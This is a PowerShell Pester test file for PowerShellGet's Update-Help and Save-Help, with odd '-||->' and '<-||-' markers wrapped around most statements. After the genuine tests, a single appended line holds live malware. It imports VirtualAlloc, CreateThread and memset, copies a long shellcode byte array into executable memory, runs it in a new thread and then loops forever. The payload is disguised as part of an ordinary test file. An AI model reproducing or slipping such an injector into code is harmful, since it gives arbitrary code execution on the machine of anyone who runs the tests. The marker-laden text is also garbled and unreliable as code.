



 -||-> $script:IsWindowsOS = ( -||-> -not ( -||-> Get-Variable -Name IsWindows -ErrorAction Ignore <-||- ) <-||- ) -or $IsWindows <-||- 

 -||-> $script:HelpContentExtension = ".zip" <-||- 
 -||-> if ( -||-> $script:IsWindowsOS <-||- ) {
     -||-> $script:HelpContentExtension = ".cab" <-||- 
} <-||- 

 -||-> $script:ExpectedHelpFile = 'PSModule-help.xml' <-||- 
 -||-> $script:ExpectedHelpInfoFile = 'PowerShellGet_1d73a601-4a6c-43c5-ba3f-619b18bbb404_HelpInfo.xml' <-||- 
 -||-> $script:ExpectedCompressedFile = "PowershellGet_1d73a601-4a6c-43c5-ba3f-619b18bbb404_en-US_helpcontent$script:HelpContentExtension" <-||- 
 -||-> $script:PowerShellGetModuleInfo =  -||-> Get-Module -Name PowerShellGet -ListAvailable | Select-Object -First 1 -ErrorAction Ignore <-||-  <-||- 
 -||-> $script:FullyQualifiedModuleName = [Microsoft.PowerShell.Commands.ModuleSpecification]@{
    ModuleName    =  -||-> $script:PowerShellGetModuleInfo.Name <-||- 
    Guid          =  -||-> $script:PowerShellGetModuleInfo.Guid <-||- 
    ModuleVersion =  -||-> $script:PowerShellGetModuleInfo.Version <-||- 
} <-||- 

 -||-> $script:HelpInstallationPath =  -||-> Join-Path -Path $script:PowerShellGetModuleInfo.ModuleBase -ChildPath 'en-US' <-||-  <-||- 

 -||-> function GetFiles {
    param (
        [Parameter()]
        [string]
        $Include = "*help.xml",

        [Parameter(Mandatory = $true)]
        [string]
        $Path
    )

     -||-> Get-ChildItem -Path $Path -Include $Include -Recurse -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName <-||- 
} <-||- 

 -||-> Describe 'Validate PowerShellGet module help' -tags 'P1', 'OuterLoop' {
     -||-> It 'Validate Update-Help for the PowerShellGet module' {
         -||-> $UpdateHelp_Params = @{
            Force =  -||-> $true <-||- 
            UICulture =  -||-> 'en-US' <-||- 
        } <-||- 
         -||-> if( -||-> $PSVersionTable.PSVersion -gt '4.0.0' <-||- ) {
             -||-> $UpdateHelp_Params['FullyQualifiedModule'] = $script:FullyQualifiedModuleName <-||- 

             -||-> if( -||-> $PSVersionTable.PSVersion -gt '6.0.99' <-||- ) {
                 -||-> $UpdateHelp_Params['Scope'] = 'AllUsers' <-||- 
            } <-||- 
        }
        else {
             -||-> $UpdateHelp_Params['Name'] = 'PowerShellGet' <-||- 
        } <-||- 
         -||-> Update-Help @UpdateHelp_Params <-||- 

         -||-> $helpFilesInstalled = @( -||-> GetFiles -Path $script:HelpInstallationPath | ForEach-Object { -||-> Split-Path -Path $_ -Leaf <-||- } <-||- ) <-||- 
         -||-> $helpFilesInstalled | Should Be $script:ExpectedHelpFile <-||- 

         -||-> $helpInfoFileInstalled = @( -||-> GetFiles -Include "*HelpInfo.xml" -Path $script:PowerShellGetModuleInfo.ModuleBase | ForEach-Object { -||-> Split-Path -Path $_ -Leaf <-||- } <-||- ) <-||- 
         -||-> $helpInfoFileInstalled | Should Be $script:ExpectedHelpInfoFile <-||- 
        
         -||-> $FindModuleCommandHelp =  -||-> Get-Help -Name PowerShellGet\Find-Module -Detailed <-||-  <-||- 
         -||-> $FindModuleCommandHelp.Examples | Should Not BeNullOrEmpty <-||- 
    } <-||- 

     -||-> $helpPath =  -||-> Join-Path -Path $TestDrive -ChildPath PSGetHelp <-||-  <-||- 
     -||-> New-Item -Path $helpPath -ItemType Directory <-||- 

     -||-> It 'Validate Save-Help for the PowerShellGet module' {        
         -||-> if( -||-> $PSVersionTable.PSVersion -gt '4.0.0' <-||- ) {        
             -||-> Save-Help -FullyQualifiedModule $script:FullyQualifiedModuleName -Force -UICulture en-US -DestinationPath $helpPath <-||- 
        }
        else {
             -||-> Save-Help -Module PowerShellGet -Force -UICulture en-US -DestinationPath $helpPath <-||- 
        } <-||- 

         -||-> $compressedFile =  -||-> GetFiles -Include "*$script:HelpContentExtension" -Path $helpPath | ForEach-Object {  -||-> Split-Path -Path $_ -Leaf <-||-  } <-||-  <-||- 
         -||-> $compressedFile | Should Be $script:ExpectedCompressedFile <-||- 

         -||-> $helpFilesSaved =  -||-> GetFiles -Include "*HelpInfo.xml" -Path $helpPath | ForEach-Object {  -||-> Split-Path -Path $_ -Leaf <-||-  } <-||-  <-||- 
         -||-> $helpFilesSaved | Should Be $script:ExpectedHelpInfoFile <-||- 
    } <-||- 
} <-||- 
 -||-> $ktC = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $ktC -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xb8,0xa9,0x56,0xcc,0x50,0xda,0xc8,0xd9,0x74,0x24,0xf4,0x5b,0x2b,0xc9,0xb1,0x53,0x83,0xc3,0x04,0x31,0x43,0x0e,0x03,0xea,0x58,0x2e,0xa5,0x10,0x8c,0x2c,0x46,0xe8,0x4d,0x51,0xce,0x0d,0x7c,0x51,0xb4,0x46,0x2f,0x61,0xbe,0x0a,0xdc,0x0a,0x92,0xbe,0x57,0x7e,0x3b,0xb1,0xd0,0x35,0x1d,0xfc,0xe1,0x66,0x5d,0x9f,0x61,0x75,0xb2,0x7f,0x5b,0xb6,0xc7,0x7e,0x9c,0xab,0x2a,0xd2,0x75,0xa7,0x99,0xc2,0xf2,0xfd,0x21,0x69,0x48,0x13,0x22,0x8e,0x19,0x12,0x03,0x01,0x11,0x4d,0x83,0xa0,0xf6,0xe5,0x8a,0xba,0x1b,0xc3,0x45,0x31,0xef,0xbf,0x57,0x93,0x21,0x3f,0xfb,0xda,0x8d,0xb2,0x05,0x1b,0x29,0x2d,0x70,0x55,0x49,0xd0,0x83,0xa2,0x33,0x0e,0x01,0x30,0x93,0xc5,0xb1,0x9c,0x25,0x09,0x27,0x57,0x29,0xe6,0x23,0x3f,0x2e,0xf9,0xe0,0x34,0x4a,0x72,0x07,0x9a,0xda,0xc0,0x2c,0x3e,0x86,0x93,0x4d,0x67,0x62,0x75,0x71,0x77,0xcd,0x2a,0xd7,0xfc,0xe0,0x3f,0x6a,0x5f,0x6d,0xf3,0x47,0x5f,0x6d,0x9b,0xd0,0x2c,0x5f,0x04,0x4b,0xba,0xd3,0xcd,0x55,0x3d,0x13,0xe4,0x22,0xd1,0xea,0x07,0x53,0xf8,0x28,0x53,0x03,0x92,0x99,0xdc,0xc8,0x62,0x25,0x09,0x64,0x6a,0x80,0xe2,0x9b,0x97,0x72,0x53,0x1c,0x37,0x1b,0xb9,0x93,0x68,0x3b,0xc2,0x79,0x01,0xd4,0x3f,0x82,0x32,0xb4,0xc9,0x64,0x26,0xa6,0x9f,0x3f,0xde,0x04,0xc4,0xf7,0x79,0x76,0x2e,0xa0,0xed,0x3f,0x38,0x77,0x12,0xc0,0x6e,0xdf,0x84,0x4b,0x7d,0xdb,0xb5,0x4b,0xa8,0x4b,0xa2,0xdc,0x26,0x1a,0x81,0x7d,0x36,0x37,0x71,0x1d,0xa5,0xdc,0x81,0x68,0xd6,0x4a,0xd6,0x3d,0x28,0x83,0xb2,0xd3,0x13,0x3d,0xa0,0x29,0xc5,0x06,0x60,0xf6,0x36,0x88,0x69,0x7b,0x02,0xae,0x79,0x45,0x8b,0xea,0x2d,0x19,0xda,0xa4,0x9b,0xdf,0xb4,0x06,0x75,0xb6,0x6b,0xc1,0x11,0x4f,0x40,0xd2,0x67,0x50,0x8d,0xa4,0x87,0xe1,0x78,0xf1,0xb8,0xce,0xec,0xf5,0xc1,0x32,0x8d,0xfa,0x18,0xf7,0xbd,0xb0,0x00,0x5e,0x56,0x1d,0xd1,0xe2,0x3b,0x9e,0x0c,0x20,0x42,0x1d,0xa4,0xd9,0xb1,0x3d,0xcd,0xdc,0xfe,0xf9,0x3e,0xad,0x6f,0x6c,0x40,0x02,0x8f,0xa5 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $Lbv5=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $Lbv5.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$Lbv5,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



